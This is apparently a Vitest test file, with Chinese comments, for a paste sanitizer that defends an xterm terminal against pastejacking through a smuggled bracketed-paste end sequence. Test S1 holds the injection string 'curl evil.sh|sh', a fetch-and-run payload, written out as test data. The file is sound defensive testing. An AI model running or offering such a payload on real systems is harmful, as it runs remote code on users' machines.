// @vitest-environment jsdom
// 安全(pastejacking):真实 xterm 6 + 粘贴净化器,断言 PTY 侧收到的 onData 数据。
// xterm 自身粘贴路径不剥离 ESC,剪贴板里的 \x1b[201~ 会让 shell 提前结束 bracketed paste,
// 其后内容免回车执行。见 README S1–S4。
import { describe, it, expect, afterEach } from 'vitest';
import { Terminal } from '@xterm/xterm';
import {
  installTerminalPasteSanitizer,
  sanitizeTerminalPaste,
} from '../../panels/Terminal/terminal-paste-sanitize';

const END = '\x1b[201~';
const disposers: Array<() => void> = [];

async function setup(bracketed: boolean) {
  const container = document.createElement('div');
  document.body.appendChild(container);
  const term = new Terminal();
  term.open(container);
  if (bracketed) await new Promise<void>((r) => term.write('\x1b[?2004h', r));
  disposers.push(installTerminalPasteSanitizer(container, term));
  disposers.push(() => {
    term.dispose();
    container.remove();
  });
  const out: string[] = [];
  term.onData((d) => out.push(d));
  const paste = (text: string) => {
    const ev = new Event('paste', { bubbles: true, cancelable: true }) as ClipboardEvent;
    Object.defineProperty(ev, 'clipboardData', { value: { getData: () => text } });
    term.textarea!.dispatchEvent(ev);
    return ev;
  };
  return { out, paste };
}

afterEach(() => {
  while (disposers.length) disposers.pop()!();
});

describe('终端粘贴净化(pastejacking)', () => {
  it('S1 粘贴含 \\x1b[201~ 的文本:结束标记只出现在末尾,注入内容留在粘贴内', async () => {
    const { out, paste } = await setup(true);
    const ev = paste(`ls${END}curl evil.sh|sh\r`);
    expect(ev.defaultPrevented).toBe(true);
    const data = out.join('');
    expect(data.startsWith('\x1b[200~')).toBe(true);
    expect(data.indexOf(END)).toBe(data.length - END.length);
    expect(data).toBe('\x1b[200~ls[201~curl evil.sh|sh\r\x1b[201~');
  });

  it('S2 其它 C0 / DEL / C1(含 8 位 CSI U+009B)被删除,\\t \\n \\r 保留', () => {
    expect(sanitizeTerminalPaste('a\x03b\x04c\x00d\x7fe\x9b201~f\x85g')).toBe('abcde201~fg');
    expect(sanitizeTerminalPaste('x\ty\nz\r')).toBe('x\ty\nz\r');
  });

  it('S3 普通多行文本行为不变(换行转 \\r + bracketed 包裹)', async () => {
    const { out, paste } = await setup(true);
    paste('echo 1\necho 2\r\n\techo 中文');
    expect(out.join('')).toBe('\x1b[200~echo 1\recho 2\r\techo 中文\x1b[201~');
  });

  it('S4 非 bracketed 模式下同样剥离 ESC(不让粘贴伪造按键序列)', async () => {
    const { out, paste } = await setup(false);
    paste('a\x1b[Ab');
    expect(out.join('')).toBe('a[Ab');
  });
});
